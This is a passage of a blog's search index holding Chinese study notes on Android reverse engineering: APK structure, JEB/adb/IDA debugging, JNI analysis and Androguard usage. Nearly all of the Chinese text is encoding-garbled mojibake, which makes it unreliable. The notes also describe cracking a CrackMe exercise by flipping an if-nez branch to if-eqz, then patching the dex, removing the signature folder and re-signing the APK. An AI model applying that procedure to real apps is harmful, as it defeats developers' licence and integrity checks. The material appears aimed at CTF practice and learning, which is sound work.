<p>ä¸€äº›é…ç½®æ¸…å•ï¼Œåå­—ã€ç‰ˆæœ¬ã€æƒé™ã€å¼•ç”¨çš„åº“æ–‡ä»¶ç­‰ç­‰ã€‚æ‰¾ä¸€ä¸ªapkçœ‹çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä»€ä¹ˆéƒ½æ‡‚äº†ã€‚</p>
<p><strong>META-INFç›®å½•</strong></p>
<p>å­˜æ”¾ç­¾åä¿¡æ¯ï¼Œandroidç¨‹åºç”Ÿæˆreleaseç‰ˆæœ¬çš„apkéœ€è¦ç­¾åï¼ŒåŠ å¯†ä¿¡æ¯åº”è¯¥å°±ä¿å­˜çš„è¿™é‡Œäº†ã€‚</p>
<p><strong>resç›®å½•</strong></p>
<p>å­˜æ”¾å„ç§èµ„æºæ–‡ä»¶ã€‚æœ€ç»ˆè¢«æ˜ å°„åˆ°Androidå·¥ç¨‹ä¸­çš„Ræ–‡ä»¶ä¸­ï¼Œå¯¹å„ç§èµ„æºä¼šç”Ÿæˆå¯¹åº”IDã€‚é€†å‘androidä¸»è¦æ˜¯æ‰¾strings.xmlï¼Œä¾¿äºå®šä½å…³é”®å­—ç¬¦ä¸²ã€‚ä¸€èˆ¬åœ¨valuesæ–‡ä»¶å¤¹ä¸­ï¼Œlayoutæ–‡ä»¶å¤¹æ˜¯å­˜æ”¾çš„åº”ç”¨ç•Œé¢å¸ƒå±€ã€‚</p>
<p><strong>libç›®å½•</strong></p>
<p>å­˜æ”¾ä¾èµ–çš„nativeåº“æ–‡ä»¶ï¼Œ.soæ–‡ä»¶æ˜¯C/C++å†™çš„ã€‚å¯ä»¥æ ¹æ®ç‰¹å®šç›®å½•ç¡®å®šæ˜¯ä»€ä¹ˆæ¶æ„çš„ã€‚.soæ–‡ä»¶åœ¨é€†å‘ä¸­åº”ç”¨æŒºå¤šã€‚</p>
<p><strong>assetsç›®å½•</strong></p>
<p>å°è±¡ä¸æ˜¯å¾ˆæ·±ï¼Œæˆ‘åœ¨ä¹‹å‰CTFé¢˜ä¸­æ²¡æœ‰ä½¿ç”¨è¿‡è¿™ä¸ªç›®å½•ã€‚å’Œresæœ‰ç‚¹ç›¸ä¼¼ã€‚</p>
<p><strong>resources.arsc</strong></p>
<p>ç¼–è¯‘åçš„äºŒè¿›åˆ¶èµ„æºæ–‡ä»¶çš„ç´¢å¼•ã€‚åº”è¯¥å°±æ˜¯ç¨‹åºè¿è¡Œï¼Œç„¶åä»è¿™ä¸ªæ–‡ä»¶æ ¹æ®å¯¹åº”IDæ‰¾åˆ°å¯¹åº”çš„resèµ„æºæ–‡ä»¶ã€‚</p>
<p><strong>classes.dexæ–‡ä»¶</strong></p>
<p>javaå­—èŠ‚ç æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¾ˆé‡è¦ï¼Œå¯ä»¥ç”¨jebç­‰è½¬æ¢æˆjavaæºç ã€‚è¯´åˆ°è¿™å°±ä¸å¾—ä¸æä¸€ä¸‹å‡ ä¸ªæ–‡ä»¶çš„è½¬æ¢äº†ã€‚</p>
<p> <img src="/2020/03/10/Androidé€†å‘åŸºç¡€/clipboard-1583806782413.png" alt="img"></p>
<p>baksmali.jarå’Œsmali.jaræœ‰æ—¶å€™javaè‡ªå¸¦çš„è€å‡ºé—®é¢˜ï¼Œæˆ‘æ˜¯ä»ç½‘ä¸Šä¸‹è½½çš„ã€‚<a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="noopener">https://bitbucket.org/JesusFreke/smali/downloads/</a></p>
<p>å½“ç„¶æ•²å‘½ä»¤æœ‰ç‚¹è´¹äº‹ï¼Œå¯ä»¥å»å¾çˆ±çš„çˆ±ç›˜ä¸‹è½½androidé€†å‘å·¥å…·åŒ…ã€‚</p>
<p><strong>Activity çš„ä¸»è¦æ–¹æ³•</strong></p>
<p><strong>onClick</strong></p>
<p>CrackMeç±»å‹çš„é¢˜ç›®ï¼Œé‡ç‚¹å…³æ³¨è¿™ä¸ªæ–¹æ³•ã€‚</p>
<p><strong>initå’ŒonCreate</strong></p>
<p>Activityåˆ›å»ºæ—¶çš„åˆå§‹åŒ–å‡½æ•°</p>
<p><strong>BuildConfigå’ŒR</strong></p>
<p>ç¼–è¯‘æ—¶è‡ªåŠ¨æ·»åŠ çš„èµ„æºç±»ï¼Œä¸å¸¸ç”¨</p>
<p><strong>Nativeå±‚ä¸so</strong></p>
<p>AndroidåŸç”Ÿä»£ç ï¼ŒLinuxä¸­çš„æ‰§è¡Œä»£ç ï¼ŒC/C++å†™çš„ï¼Œåº•å±‚æ˜¯ARMæ±‡ç¼–ï¼Œå¾ˆé‡è¦ã€‚</p>
<p><strong>JNI_ONLOAD</strong></p>
<p>è¿™ä¸ªå‡½æ•°æ˜¯Dalvikè™šæ‹ŸæœºåŠ è½½åº“æ—¶çš„åˆå§‹åŒ–å‡½æ•°ã€‚</p>
<p><strong>åŠ¨æ€è°ƒè¯•Smaliä»£ç æ¼”ç¤º</strong></p>
<p>ä½¿ç”¨adb install xxxxxx.apk</p>
<p>å®‰è£…apkã€‚</p>
<p>æ‹–å…¥apkåˆ°jebä¸­ï¼ŒCtrl+Bä¸‹æ–­ç‚¹ã€‚</p>
<p> ä½¿ç”¨adb shell am start -D -n com.droider.crackme0201/.MainActivity   è®©ç¨‹åºå¤„äºç­‰å¾…è°ƒè¯•çŠ¶æ€</p>
<p>ç„¶åç‚¹ è°ƒè¯•å™¨-&gt;å¼€å§‹</p>
<p>é™„åŠ ã€‚æ–­ç‚¹è®¾åœ¨ç‚¹å‡»äº‹ä»¶åã€‚</p>
<p>ç„¶åæ­£å¸¸æ‰§è¡Œappï¼Œå°±ä¼šåœ¨æŒ‡å®šæ–­ç‚¹å¤„æ–­ä¸‹æ¥ã€‚</p>
<p>å¯ä»¥æŸ¥çœ‹å±€éƒ¨å˜é‡ã€‚</p>
<p><img src="/2020/03/10/Androidé€†å‘åŸºç¡€/clipboard-1583806831184.png" alt="img"></p>
<p>åœ¨VM ç»ˆç«¯ä¸­å¯ä»¥æ‰§è¡ŒæŒ‡ä»¤ï¼š</p>
<p><img src="/2020/03/10/Androidé€†å‘åŸºç¡€/clipboard-1583806844916.png" alt="img"></p>
<p><img src="/2020/03/10/Androidé€†å‘åŸºç¡€/clipboard-1583806852913.png" alt="img"></p>
<p>è¿˜æœ‰å¾ˆå¤šç”¨æ³•ï¼Œæˆ‘ä¹Ÿä¸ä¼šç”¨ã€‚</p>
<p>åˆ¤æ–­è·³è½¬:</p>
<p><img src="/2020/03/10/Androidé€†å‘åŸºç¡€/clipboard.png" alt="![img](D:/æœ‰é“ç¬”è®°/æ•°æ®/qq20118A67A04314627D0DF4F3B9EFF13F/7d45d1529d4c41eead3e0d46a2c8f067/clipboard.png)"></p>
<p>ç”¨APKIDEä¿®æ”¹ if-nez ä¸º if-eqzã€‚</p>
<p>APKç ´è§£æˆåŠŸã€‚</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>Androidé€†å‘</category>
      </categories>
      <tags>
        <tag>Androidé€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>AndroidåŠ¨æ€è°ƒè¯•</title>
    <url>/2020/03/10/Android%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="AndroidåŠ¨æ€è°ƒè¯•æ”¯æŒ"><a href="#AndroidåŠ¨æ€è°ƒè¯•æ”¯æŒ" class="headerlink" title="AndroidåŠ¨æ€è°ƒè¯•æ”¯æŒ"></a>AndroidåŠ¨æ€è°ƒè¯•æ”¯æŒ</h1><ul>
<li>dalvikå®ç°äº†JDWP(Java Debug wire Protocol,Javaè°ƒè¯•æœ‰çº¿åè®®)ï¼Œå¯ç›´æ¥ä½¿ç”¨æ”¯æŒæ­¤åè®®çš„è°ƒè¯•å™¨æ¥è°ƒè¯•Androidç¨‹åºã€‚</li>
<li>dalvikä¸ºJDWPçš„å®ç°åŠ å…¥äº†DDM(Dalvik Debug Monitor,Dalvikè°ƒè¯•ç›‘è§†å™¨)ã€‚å…·ä½“çš„å®ç°æœ‰DDMS(Dalvik Debug Monitor Server,è°ƒè¯•ç›‘è§†å™¨æœåŠ¡)å’ŒEclipse ADTæ’ä»¶ã€‚</li>
<li>ç³»ç»Ÿå±æ€§ro.debuggableä¸º1æ—¶æ‰€æœ‰ç¨‹åºéƒ½ä¼šå¼€å¯è°ƒè¯•(adb shell getprop ro.debuggableæ£€æŸ¥)ï¼Œè‹¥ä¸º0ï¼Œåˆ™ä¼šåˆ¤æ–­AndroidManifest.xmlä¸­çš„debuggableå±æ€§ã€‚</li>
</ul>
<h1 id="DDMSçš„ä½¿ç”¨"><a href="#DDMSçš„ä½¿ç”¨" class="headerlink" title="DDMSçš„ä½¿ç”¨"></a>DDMSçš„ä½¿ç”¨</h1><p>Logcatã€æ–‡ä»¶æµè§ˆã€Method Profilingç­‰ã€‚</p>
<p>Logcatè§†å›¾ç›¸å½“äº<code>adb logcat -s com.droider.jnimethods:V</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">adb logcat -s TagName:<span class="keyword">Type</span></span><br></pre></td></tr></table></figure>

<h1 id="å®šä½å…³é”®ä»£ç "><a href="#å®šä½å…³é”®ä»£ç " class="headerlink" title="å®šä½å…³é”®ä»£ç "></a>å®šä½å…³é”®ä»£ç </h1><h2 id="ä»£ç æ³¨å…¥æ³•"><a href="#ä»£ç æ³¨å…¥æ³•" class="headerlink" title="ä»£ç æ³¨å…¥æ³•"></a>ä»£ç æ³¨å…¥æ³•</h2><p>é€šè¿‡Logè¾“å‡ºå®šä½å…³é”®ä»£ç ï¼Œç”šè‡³ç ´è§£ç¨‹åºã€‚</p>
<h2 id="æ ˆè·Ÿè¸ªæ³•"><a href="#æ ˆè·Ÿè¸ªæ³•" class="headerlink" title="æ ˆè·Ÿè¸ªæ³•"></a>æ ˆè·Ÿè¸ªæ³•</h2><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">javaä»£ç ï¼š</span><br><span class="line">   <span class="built_in"> new </span>Exception(<span class="string">"print trace"</span>).printStackTrace();</span><br><span class="line">smaliä»£ç :</span><br><span class="line">   <span class="built_in"> new-instance </span>v0, <span class="class">Ljava/lang/Exception;</span></span><br><span class="line">   <span class="built_in"> const-string </span>v1, <span class="string">"print trace"</span></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v0, v1&#125;, <span class="class">Ljava/lang/Exception;</span>-&gt;&lt;init&gt;(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0&#125;, <span class="class">Ljava/lang/Exception;</span>-&gt;printStackTrace()V</span><br></pre></td></tr></table></figure>

<p>æ ˆè·Ÿè¸ªä¿¡æ¯æ˜¯WARNçº§åˆ«çš„log</p>
<h2 id="Method-Profiling"><a href="#Method-Profiling" class="headerlink" title="Method Profiling"></a>Method Profiling</h2><p>ç›¸å½“äºOllydbgçš„traceåŠŸèƒ½ï¼Œè·Ÿè¸ªä¿¡æ¯ã€‚</p>
<p>é€šè¿‡æ–¹æ³•è®¾ç½®è·Ÿè¸ªçš„å¼€å§‹å’Œåœæ­¢ï¼š</p>
<p><img src="/2020/03/10/AndroidåŠ¨æ€è°ƒè¯•/image-20200311221443847.png" alt="image-20200311221443847"></p>
<p>smaliä»£ç å¦‚ä¸‹ï¼š</p>
<p><img src="/2020/03/10/AndroidåŠ¨æ€è°ƒè¯•/image-20200311221616231.png" alt="image-20200311221616231"></p>
<p>æ­¤æ–¹æ³•ä¼šåœ¨æ–‡ä»¶ä¸‹ç”Ÿæˆtraceæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨SDKç›®å½•ä¸‹çš„traceviewå·¥å…·æ‰“å¼€ï¼Œä½¿ç”¨æ­¤æ–¹æ³•è¿˜éœ€è¦æœ‰SDå¡å†™å…¥æƒé™ã€‚</p>
<h1 id="IDAè°ƒè¯•åŸç”Ÿç¨‹åº"><a href="#IDAè°ƒè¯•åŸç”Ÿç¨‹åº" class="headerlink" title="IDAè°ƒè¯•åŸç”Ÿç¨‹åº"></a>IDAè°ƒè¯•åŸç”Ÿç¨‹åº</h1><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">å¯åŠ¨android_serveræ–‡ä»¶</span><br><span class="line">è½¬å‘ç«¯å£ adb forward tcp:<span class="number">23946</span> tcp:<span class="number">23946</span></span><br><span class="line">è®¾ç½®ç­‰å¾…è°ƒè¯• adb <span class="keyword">shell</span> <span class="keyword">am</span> start -D -n åŒ…å/ç±»å</span><br><span class="line">IDA attachè¿›ç¨‹</span><br><span class="line">jdbé™„åŠ  jdb -connect <span class="keyword">com</span>.<span class="keyword">sun</span>.jdi.SocketAttach:<span class="built_in">hostname</span>=localhost,port=<span class="number">8700</span></span><br><span class="line">åˆ—å‡ºè¿›ç¨‹ <span class="keyword">ps</span> -aux</span><br><span class="line">æ€æ­»è¿›ç¨‹ kill -s <span class="number">9</span> PID (å…¶ä¸­-s <span class="number">9</span> åˆ¶å®šäº†ä¼ é€’ç»™è¿›ç¨‹çš„ä¿¡å·æ˜¯ï¼™ã€‚å¼ºåˆ¶ã€å°½å¿«ç»ˆæ­¢è¿›ç¨‹ã€‚)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>Androidé€†å‘</category>
      </categories>
      <tags>
        <tag>Androidé€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>AndroidNDKé€†å‘</title>
    <url>/2020/03/10/AndroidNDK%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="åŸç”ŸCç¨‹åºé€†å‘åˆ†æ"><a href="#åŸç”ŸCç¨‹åºé€†å‘åˆ†æ" class="headerlink" title="åŸç”ŸCç¨‹åºé€†å‘åˆ†æ"></a>åŸç”ŸCç¨‹åºé€†å‘åˆ†æ</h2><p>.pltæ®µä¸»è¦æ˜¯ç”¨äºå‡½æ•°é‡å®šä½çš„ã€‚<br>.textæ®µå°±æ˜¯ç¨‹åºä»£ç æ®µã€‚</p>
<ul>
<li>åæ±‡ç¼–ã€‚<br>  objdump -S filename  </li>
</ul>
<p>æœ¬ä»¥ä¸ºè¿™èŠ‚ä¸ç”¨è®°å½•ï¼Œæ„Ÿè§‰éƒ½èƒ½çœ‹æ‡‚ï¼Œæ±‡ç¼–çœ‹å¤šäº†å°±ä¼šäº†ï¼Œä½†æ˜¯ç«Ÿç„¶å‘ç°äº†æƒŠå¤©å¤§ç§˜å¯†ã€‚çœ‹ä¸‹è¾¹ï¼š<br><img src="/2020/03/10/AndroidNDKé€†å‘/image-20200310102238328.png" alt="image-20200310102238328"><br>ä¸€ç›´ä»¥ä¸ºPCæ˜¯æŒ‡ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä½†æ˜¯åœ¨è¿™é‡ŒADDLSè¿™æ¡æŒ‡ä»¤ï¼Œæˆ‘å‘ç°æ€ä¹ˆéƒ½ä¸å¯èƒ½æŒ‰ç…§æ­£å¸¸é€»è¾‘æ‰§è¡Œï¼Œæˆ‘éƒé—·äº†1ä¸ªå°æ—¶ï¼Œç»ˆäºæ‰¾åˆ°äº†æºå¤´ã€‚<br>[<a href="https://blog.csdn.net/lee244868149/article/details/49488575]" target="_blank" rel="noopener">https://blog.csdn.net/lee244868149/article/details/49488575]</a>  </p>
<p>PCéœ€è¦å–æŒ‡ã€è¯‘ç ã€æ‰§è¡Œä¸‰æ­¥ï¼Œæ¯æ¬¡å–æŒ‡å®Œå°±æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤å³PC+4ã€‚ç„¶åå–æŒ‡å®ŒååˆæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå³PC+8ã€‚<br><img src="/2020/03/10/AndroidNDKé€†å‘/image-20200310102307647.png" alt="image-20200310102307647"></p>
<p>æ‰€ä»¥ç¬¬ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œçš„æ—¶å€™ï¼ŒPC=PC+8.</p>
<h5 id="é™¤æ³•"><a href="#é™¤æ³•" class="headerlink" title="é™¤æ³•"></a>é™¤æ³•</h5><h4 id="ç¼–è¯‘ä¼˜åŒ–"><a href="#ç¼–è¯‘ä¼˜åŒ–" class="headerlink" title="ç¼–è¯‘ä¼˜åŒ–"></a>ç¼–è¯‘ä¼˜åŒ–</h4><p>gcc -O å¯ä»¥è¿›è¡Œä¼˜åŒ–ã€‚5ä¸ªç­‰çº§0,1,2,3,s  </p>
<h2 id="C-é€†å‘åˆ†æ"><a href="#C-é€†å‘åˆ†æ" class="headerlink" title="C++é€†å‘åˆ†æ"></a>C++é€†å‘åˆ†æ</h2><p>C++æ˜¯ç¥ï¼Œåˆ†æä¸æ¥ã€‚ã€‚ã€‚awsl</p>
<h2 id="JNI-APIé€†å‘åˆ†æ"><a href="#JNI-APIé€†å‘åˆ†æ" class="headerlink" title="JNI APIé€†å‘åˆ†æ"></a>JNI APIé€†å‘åˆ†æ</h2><p>JNINativeInterface:  </p>
<pre><code>JNIæœ¬åœ°æ¥å£ï¼Œä¸€ä¸ªæ¥å£å‡½æ•°æŒ‡é’ˆè¡¨ï¼Œæœ‰JNIæ¥å£çš„å‡½æ•°æŒ‡é’ˆã€‚  </code></pre><p>JNIInvokeInterface:</p>
<pre><code>JNIè°ƒç”¨æ¥å£ï¼Œæœ‰3ä¸ªä¿ç•™é¡¹ï¼Œ5ä¸ªå‡½æ•°æŒ‡é’ˆã€‚  </code></pre><p><img src="/2020/03/10/AndroidNDKé€†å‘/image-20200310102327161.png" alt="image-20200310102327161"><br>JNIEnvç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªå­—æ®µå°±æ˜¯JNINativeInterfaceï¼ŒIDAåˆ†ææ—¶ä¸ä¼šè¯†åˆ«APIï¼Œå°†å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ç±»å‹æ”¹ä¸ºJNIEnvç±»å‹å°±å¯ä»¥è¯†åˆ«äº†ï¼Œæˆ–è€…å¯¼å…¥JNIEnvç»“æ„ä½“ã€‚<br>å¯¹ç…§ç€ç»“æ„ä½“çœ‹ï¼Œå¯ä»¥çŸ¥é“IDAä¸­ç›¸å¯¹å¯„å­˜å™¨çš„åç§»å¤„å°±æ˜¯APIå‡½æ•°ã€‚  </p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>Androidé€†å‘</category>
      </categories>
      <tags>
        <tag>Androidé€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>Androidé™æ€åˆ†æ</title>
    <url>/2020/03/10/Android%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="IDAç ´è§£å®ä¾‹-å®šä½å…³é”®ä»£ç "><a href="#IDAç ´è§£å®ä¾‹-å®šä½å…³é”®ä»£ç " class="headerlink" title="IDAç ´è§£å®ä¾‹-å®šä½å…³é”®ä»£ç "></a>IDAç ´è§£å®ä¾‹-å®šä½å…³é”®ä»£ç </h3><h4 id="æœç´¢ç‰¹å¾å­—ç¬¦ä¸²"><a href="#æœç´¢ç‰¹å¾å­—ç¬¦ä¸²" class="headerlink" title="æœç´¢ç‰¹å¾å­—ç¬¦ä¸²"></a>æœç´¢ç‰¹å¾å­—ç¬¦ä¸²</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ctrl+så®šä½<span class="built_in">string</span>sæ®µ</span><br><span class="line"><span class="number">2.</span> alt+tå¿«æ·é”®æœç´¢æ–‡æœ¬å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>

<h4 id="æœç´¢API"><a href="#æœç´¢API" class="headerlink" title="æœç´¢API"></a>æœç´¢API</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> å®šä½åˆ°codeæ®µ</span><br><span class="line"><span class="number">2.</span> æœç´¢APIåç§°</span><br></pre></td></tr></table></figure>

<h4 id="æœç´¢æ–¹æ³•å"><a href="#æœç´¢æ–¹æ³•å" class="headerlink" title="æœç´¢æ–¹æ³•å"></a>æœç´¢æ–¹æ³•å</h4><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">åœ¨<span class="keyword">Exports</span>çª—å£ä¸­æœç´¢æ–¹æ³•å</span><br></pre></td></tr></table></figure>

<blockquote>
<p>if-eqzçš„opcodeæ˜¯0x38<br>if-nezçš„opcodeæ˜¯0x39<br>returnçš„opcodeæ˜¯0x0f</p>
</blockquote>
<h4 id="ä¿®æ”¹dexï¼Œæ›¿æ¢apkä¸­çš„dex"><a href="#ä¿®æ”¹dexï¼Œæ›¿æ¢apkä¸­çš„dex" class="headerlink" title="ä¿®æ”¹dexï¼Œæ›¿æ¢apkä¸­çš„dex"></a>ä¿®æ”¹dexï¼Œæ›¿æ¢apkä¸­çš„dex</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ä½¿ç”¨dexFixeræ›´æ–°checksum</span><br><span class="line"><span class="number">2.</span> å°†ä¿®æ”¹åçš„dexé‡æ–°æ”¾å›apkåŒ…é‡Œ</span><br><span class="line"><span class="number">3.</span> åˆ é™¤META-INFæ–‡ä»¶å¤¹</span><br><span class="line"><span class="number">4.</span> å¯¹apké‡ç­¾åå³å¯å®‰è£…</span><br></pre></td></tr></table></figure>

<h4 id="ç»ˆæ­¢ç¨‹åº"><a href="#ç»ˆæ­¢ç¨‹åº" class="headerlink" title="ç»ˆæ­¢ç¨‹åº"></a>ç»ˆæ­¢ç¨‹åº</h4><ul>
<li><p>Contextçš„finish()æ–¹æ³•</p>
</li>
<li><p>android.os.Processçš„killProcess()æ–¹æ³•</p>
</li>
</ul>
<h3 id="Androguardç®€å•ä½¿ç”¨"><a href="#Androguardç®€å•ä½¿ç”¨" class="headerlink" title="Androguardç®€å•ä½¿ç”¨"></a>Androguardç®€å•ä½¿ç”¨</h3><ul>
<li><p><a href="http://androapkinfo.py" target="_blank" rel="noopener">androapkinfo.py</a><br>æŸ¥çœ‹apkä¿¡æ¯ã€‚åŒ…ã€èµ„æºã€æƒé™ã€ç»„ä»¶ã€æ–¹æ³•ã€‚<br>androapkinfo -i filename</p>
</li>
<li><p><a href="http://androaxml.py" target="_blank" rel="noopener">androaxml.py</a><br>è§£æAndroidManifest.xmlæ–‡ä»¶ã€‚<br>androaxml -i filename</p>
</li>
<li><p><a href="http://androcsign.py" target="_blank" rel="noopener">androcsign.py</a><br>æ”¶é›†ç­¾ååˆ°æ•°æ®åº“ä¸­ï¼Œä½¿ç”¨å‰éœ€è¦ä¸ºapkç¼–å†™signæ–‡ä»¶ã€‚</p>
</li>
<li><p><a href="http://androdd.py" target="_blank" rel="noopener">androdd.py</a><br>ç”Ÿæˆapkæ¯ä¸ªç±»çš„æ–¹æ³•çš„è°ƒç”¨æµç¨‹å›¾ã€‚<br>androdd -i filename -o dirname -d -f PNG<br>-d æ˜¯æŒ‡å®šç”Ÿæˆdotå›¾å½¢æ–‡ä»¶ã€‚</p>
</li>
<li><p><a href="http://androdiff.py" target="_blank" rel="noopener">androdiff.py</a><br>æ¯”è¾ƒä¸¤ä¸ªapkæ–‡ä»¶çš„å·®å¼‚ã€‚<br>androdiff -i filename1 filename2</p>
</li>
<li><p><a href="http://androdump.py" target="_blank" rel="noopener">androdump.py</a><br>dumpä¸€ä¸ªLinuxè¿›ç¨‹ã€‚<br>androdump -i pid</p>
</li>
<li><p><a href="http://androgexf.py" target="_blank" rel="noopener">androgexf.py</a><br>ç”Ÿæˆä¸€ä¸ªgexfå›¾å½¢æ–‡ä»¶ã€‚ç”¨GephiæŸ¥çœ‹ã€‚<br>androgexf -i filename1 -o filename2</p>
</li>
<li><p><a href="http://androlyze.py" target="_blank" rel="noopener">androlyze.py</a><br>æä¾›äº¤äº’ç¯å¢ƒé™æ€åˆ†æandroidç¨‹åºã€‚</p>
</li>
<li><p><a href="http://andromercury.py" target="_blank" rel="noopener">andromercury.py</a><br>Mercuryå·¥å…·çš„æ¡†æ¶ã€‚</p>
</li>
<li><p><a href="http://androrisk.py" target="_blank" rel="noopener">androrisk.py</a><br>è¯„ä¼°apkæ–‡ä»¶ä¸­çš„æ½œåœ¨æ–¹æ³•ã€‚<br>androrisk -m -i filename<br>m è¡¨ç¤ºéœ€è¦åˆ†ææ¯ä¸€ä¸ªæ–¹æ³•ã€‚</p>
</li>
<li><p><a href="http://androsign.py" target="_blank" rel="noopener">androsign.py</a><br>æ£€æµ‹ç­¾åæ˜¯å¦å­˜äºæ•°æ®åº“ï¼Œä¸androcsignä½œç”¨ç›¸åã€‚<br><img src="/2020/03/10/Androidé™æ€åˆ†æ/image-20200310102455464.png" alt="image-20200310102455464"></p>
</li>
<li><p><a href="http://androsim.py" target="_blank" rel="noopener">androsim.py</a><br>è®¡ç®—ä¸¤ä¸ªapkæ–‡ä»¶çš„ç›¸ä¼¼åº¦ã€‚<br>androsim -i filename1 filename2</p>
</li>
<li><p><a href="http://androxgmml.py" target="_blank" rel="noopener">androxgmml.py</a><br>ç”Ÿæˆjar/class/apk/dexæ–‡ä»¶çš„æ§åˆ¶æµç¨‹åŠåŠŸèƒ½è°ƒåº¦å›¾ï¼Œè¾“å‡ºæ ¼å¼ä¸ºxgmmlã€‚<br>androxgmml -i filename -o *.xgmml</p>
</li>
<li><p><a href="http://apkviewer.py" target="_blank" rel="noopener">apkviewer.py</a><br>ä¸ºæ¯ä¸€ä¸ªç±»ç”Ÿæˆä¸€ä¸ªç‹¬ç«‹çš„graphmlå›¾å½¢æ–‡ä»¶ã€‚<br>apkviewer -i filename -o xxx</p>
</li>
</ul>
<h3 id="androlyzeçš„ç®€å•ä½¿ç”¨"><a href="#androlyzeçš„ç®€å•ä½¿ç”¨" class="headerlink" title="androlyzeçš„ç®€å•ä½¿ç”¨"></a>androlyzeçš„ç®€å•ä½¿ç”¨</h3><p>androlyze -s //è·å–äº¤äº’å‘½ä»¤è¡Œæ¨¡å¼</p>
<ol>
<li>è·å–apkæ–‡ä»¶å¯¹è±¡<br>a = APK(â€œfilenameâ€)</li>
<li>è·å–dexæ–‡ä»¶å¯¹è±¡<br>d = DalvikVMFormat(a.get_dex())</li>
<li>è·å–åˆ†æç»“æœå¯¹è±¡<br>dx = VMAnalysis(d)</li>
<li>ä¸‰åˆä¸€æŒ‡ä»¤<br>a, d, dx = APK(â€œfilenameâ€, decompiler=â€dadâ€)<br>decompileræŒ‡å®šåç¼–è¯‘å™¨åç§°ã€‚</li>
</ol>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>Androidé€†å‘</category>
      </categories>
      <tags>
        <tag>Androidé€†å‘</tag>
      </tags>
  </entry>
</search>
